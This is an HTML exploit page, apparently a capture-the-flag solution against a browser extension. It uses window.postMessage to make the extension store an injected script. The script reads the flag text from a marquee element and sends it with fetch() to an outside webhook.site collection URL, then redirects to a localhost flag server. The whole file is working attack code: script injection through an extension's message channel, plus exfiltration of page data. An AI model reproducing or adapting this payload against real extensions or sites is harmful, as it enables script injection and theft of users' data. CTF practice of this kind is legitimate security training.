<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <script>
        // Set replacement string to JavaScript that will exfiltrate the flag
        const maliciousReplacement = `
            <script>
                // Extract flag from marquee element
                const flagElement = document.querySelector('marquee');
                if (flagElement) {
                    const flag = flagElement.textContent;
                    // Exfiltrate to our server
                    fetch('https://webhook.site/48b22416-0da4-4d88-b635-2b0a83eb8b60?flag=' + encodeURIComponent(flag));
                }
            <\/script>
        `;

        // Wait a moment then set the replacement string
        setTimeout(() => {
            // Send message to extension to set replacement string
            window.postMessage({
                type: "SET",
                replacementString: maliciousReplacement
            }, "*");
            
            // Redirect to flag server after setting the replacement
            setTimeout(() => {
                window.location.href = 'http://localhost:1337';
            }, 500);
        }, 1000);
    </script>
</body>
</html>